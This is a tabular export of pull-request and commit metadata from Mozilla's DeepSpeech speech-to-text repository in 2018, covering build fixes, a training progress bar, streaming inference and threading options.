2991,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1499,1499,Fix v0.1.1 rebuild branch filtering,,lissyx,1645737,2018-08-14T11:20:29Z,COLLABORATOR,True,2,8,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a6172b7e8beb6a1fb99d80406e4fae89604ce5a,Fix v0.1.1 rebuild branch filtering
2992,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1498,1498,Update TensorFlow artifacts for rebuilding v0.1.1,,lissyx,1645737,2018-08-13T14:35:07Z,COLLABORATOR,True,36,36,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75acb10ee2bafe088c021cbe6e5821d5ecca1f82,Update TensorFlow artifacts for rebuilding v0.1.1
2993,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1497,1497,Needed to add WORD_COUNT_WEIGHT parameter,to make it work.,justindixon,24518925,2018-08-13T13:32:49Z,NONE,False,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39017ca5f6c33a2354f5ca53e7cbafcdbe229452,"Needed to add WORD_COUNT_WEIGHT parameter

to make it work."
2994,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1495,1495,Handle optional arguments and version flag correctly in Python and JS clients (Fixes #1490),,reuben,477142,2018-08-10T22:48:00Z,MEMBER,True,38,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac818882e073501d65a9c8cbb4a59a02c16c361a,Handle optional arguments and version flag correctly in Python and JS clients
2995,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1495,1495,Handle optional arguments and version flag correctly in Python and JS clients (Fixes #1490),,reuben,477142,2018-08-10T22:48:00Z,MEMBER,True,38,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,295fa7128b5afbc72554048801c745f561745a51,Fix training progress bar on repeated epochs of the same set
2996,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1494,1494,"Free StreamingState pointer with delete instead of new, expose cheap state deallocation API",,reuben,477142,2018-08-10T15:33:24Z,MEMBER,True,19,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f27928841c2595c8dd9d08f482c95ca9e42f4b5,"Free StreamingState pointer with delete instead of new, expose cheap state deallocation API"
2997,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1488,1488,added progressbar,"
![43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c](https://user-images.githubusercontent.com/1129837/43949955-b3f2997e-9c97-11e8-988c-38a26f36b239.png)

(had problems rebasing/merging, decided just to make new PR) 
Previous PR: #1482 ",GeorgeFedoseev,1129837,2018-08-10T09:17:56Z,CONTRIBUTOR,True,41,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9997104b176ac57f187b38d7241bdb885663eab,added progressbar
2998,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1487,1487,Quick #1485 fix. For now added @samgd 4-gram LM built from LibriSpeech train-*,,kdavis-mozilla,12054740,2018-08-10T04:06:21Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fb130012ace25e4ec7651fbdbf97a6506ad51c3,"Quick #1485 fix, for now added OpenSLR SLR11 3-gram"
2999,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1487,1487,Quick #1485 fix. For now added @samgd 4-gram LM built from LibriSpeech train-*,,kdavis-mozilla,12054740,2018-08-10T04:06:21Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a96954b4a9c121f2d359f110502bb8be6a33b233,Quick #1485 fix. For now added @samgd 4-gram LM built from LibriSpeech train-*
3000,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1484,1484,Fix typo,,est31,8872119,2018-08-09T11:26:32Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1f9e35e31aa843ec1b39d424aeba7b791a4557d,Fix typo
3001,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1482,1482,added progressbar for training,"![screen shot 2018-08-06 at 13 43 10](https://user-images.githubusercontent.com/1129837/43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c.png)
",GeorgeFedoseev,1129837,2018-08-06T10:57:57Z,CONTRIBUTOR,False,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dea82c2c3892973031d963f3c74e64792338c132,added progress bar for training
3002,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1482,1482,added progressbar for training,"![screen shot 2018-08-06 at 13 43 10](https://user-images.githubusercontent.com/1129837/43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c.png)
",GeorgeFedoseev,1129837,2018-08-06T10:57:57Z,CONTRIBUTOR,False,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb87ebe3696a3307d0eaac765695c3f6b3c11e74,Merge branch 'master' into progressbar
3003,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1482,1482,added progressbar for training,"![screen shot 2018-08-06 at 13 43 10](https://user-images.githubusercontent.com/1129837/43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c.png)
",GeorgeFedoseev,1129837,2018-08-06T10:57:57Z,CONTRIBUTOR,False,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4306b8c7585cceabc89fa22b683a8d676b6858ec,"removed extra logs, removed extra whitespace"
3004,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1482,1482,added progressbar for training,"![screen shot 2018-08-06 at 13 43 10](https://user-images.githubusercontent.com/1129837/43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c.png)
",GeorgeFedoseev,1129837,2018-08-06T10:57:57Z,CONTRIBUTOR,False,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a10a610b88945a5dae37067ab71e3964e48f9c3d,"# This is a combination of 5 commits.
# This is the 1st commit message:
added progress bar for training

# This is the commit message #2:

Streaming inference

# This is the commit message #3:

Add tool to find out which ops are needed by a graph

# This is the commit message #4:

Update native_client/BUILD comment about binary sizes

# This is the commit message #5:

Add tool to convert graph protobuf to pbtxt"
3005,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1482,1482,added progressbar for training,"![screen shot 2018-08-06 at 13 43 10](https://user-images.githubusercontent.com/1129837/43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c.png)
",GeorgeFedoseev,1129837,2018-08-06T10:57:57Z,CONTRIBUTOR,False,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d192bcce037a0d066ddbd34ff562994cdfbdf64b,added progressbar
3006,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1482,1482,added progressbar for training,"![screen shot 2018-08-06 at 13 43 10](https://user-images.githubusercontent.com/1129837/43712895-6c1d49c4-9980-11e8-89c3-d4e11801f10c.png)
",GeorgeFedoseev,1129837,2018-08-06T10:57:57Z,CONTRIBUTOR,False,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07a73e773df097bceed2c968981608564edfec01,merge
3007,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,400c9c0e5dbcf499f3cc2bf6af1dc3cf84ce8142,Streaming inference
3008,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2be00fad008df371b77055ea8ff9d95ed4877af,Add tool to find out which ops are needed by a graph
3009,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e438ed6f8c9360a08df7fc46a77df83a7ac57fcc,Update native_client/BUILD comment about binary sizes
3010,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e383ac59f23956f91a42825dab4125b052259c8,Add tool to convert graph protobuf to pbtxt
3011,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,831ebf40813deab68c9875b0cef073bc63cc9989,Add evaluate.py script to create a WER report from a checkpoint using the inference graph
3012,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49490f5e68c0cbb2add00762d3a64df870b72103,Increase CI training epochs to guarantee overfitting
3013,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae9c62cae9e4d05df572a57278b711c71b49483c,Convert native API to C instead of C++
3014,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc84bb658abcf91870c049bbbaa3437a23c6404a,Remove some deepspeech_utils references that crept up during rebase
3015,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b8871cd946bf020f756035ba9a42f8f529c5188,Infer n_steps and n_context from model file
3016,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b95ed698168dc06bf645a4b03ef17f0429b6b95,Switch to LSTMBlockFusedCell
3017,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48778fcd0e4721e861135f798b4ac7340c3b399b,Don't handle dropout rates as Python values
3018,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f810ee0017be73c85d0c9554c395e0217cbfad7,Add intermediateDecode method to the API
3019,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cbb33c85637876145d6c0e279743c5397f4fbd24,Finalize training graph before starting training
3020,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac41fe0006a723cd1f76c3124f0fea21b40e21a8,Disable AOT tasks
3021,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,385bc7a65fecea519bc5733b1c42015422dd7ed3,Remove word count bonus in favor of length normalization
3022,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8fecc33333c4855087c02d15a6a91b89c3494598,Architecture changes from training
3023,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c579b74a1d934c5064a5328c6f5bcb89bc3e6814,Switch to updated head in TensorFlow r1.6 branch
3024,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75091a8ef376d77ad68ae868006d153019080c19,Switch prod model to a streaming based one
3025,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,51cac1031b69bf07193821fe8b6fbbc97bb9ef8a,Address review comments
3026,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fb81ac1fa61c014441e5a3eff5d845a1d786d6b,Added support inter/intra-op parallelism threads.
3027,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3091b30b0516ef308944ddaaf6cf722c13b270ac,"Merge pull request #1463 from mozilla/streaming-inference

Streaming Inference"
3028,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1f9e35e31aa843ec1b39d424aeba7b791a4557d,Fix typo
3029,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1aac5f47cd7baed245ccfdd1569e4ad8e476893e,"Merge pull request #1484 from est31/master

Fix typo in DS_IntermediateDecode documentation"
3030,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fb130012ace25e4ec7651fbdbf97a6506ad51c3,"Quick #1485 fix, for now added OpenSLR SLR11 3-gram"
3031,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d59cdc34544ae3b3055cdc704b2d4330f1e0e433,Bump to v0.2.0-alpha.9
3032,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9997104b176ac57f187b38d7241bdb885663eab,added progressbar
3033,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a96954b4a9c121f2d359f110502bb8be6a33b233,Quick #1485 fix. For now added @samgd 4-gram LM built from LibriSpeech train-*
3034,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f27928841c2595c8dd9d08f482c95ca9e42f4b5,"Free StreamingState pointer with delete instead of new, expose cheap state deallocation API"
3035,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83086e7dd2691a574c97c2c20d1fcc714088e857,"Merge pull request #1488 from GeorgeFedoseev/progressbar

Add progressbar to monitor intra-epoch progress"
3036,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1480,1480,Added support for inter-op and intra-op parallelism threads.,"Setting these parameters would boost CPU performance (https://software.intel.com/en-us/articles/tensorflow-optimizations-on-modern-intel-architecture). More information about these parameters can be found here: https://github.com/tensorflow/tensorflow/blob/r1.9/tensorflow/core/protobuf/config.proto
",bhavani-subramanian,28113241,2018-08-03T21:47:04Z,CONTRIBUTOR,False,1859,1397,75,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2a96c67950a8a3d1731c943eec039060285ebb9c,"Merge pull request #1494 from mozilla/issue1492

Free StreamingState pointer with delete instead of new, expose cheap state deallocation API"
3037,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1479,1479,Remove deprecated automation code,Fixes #1478,lissyx,1645737,2018-07-30T10:37:12Z,COLLABORATOR,True,161,646,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d3818b492045ccea0cea660c27355994c1413b6,"Remove deprecated automation code

Fixes #1478"
3038,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1476,1476,Remove deprecated tests,"We are now only relying on upstream TensorFlow packages and aiming at
being compatible. Makes no sense to continue supporting those,
especially since they are disabled.",lissyx,1645737,2018-07-26T07:42:48Z,COLLABORATOR,True,10,97,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e809e4746a192ea567fa1ac9d0053f3a497908c6,"Remove deprecated tests

We are now only relying on upstream TensorFlow packages and aiming at
being compatible. Makes no sense to continue supporting those,
especially since they are disabled."
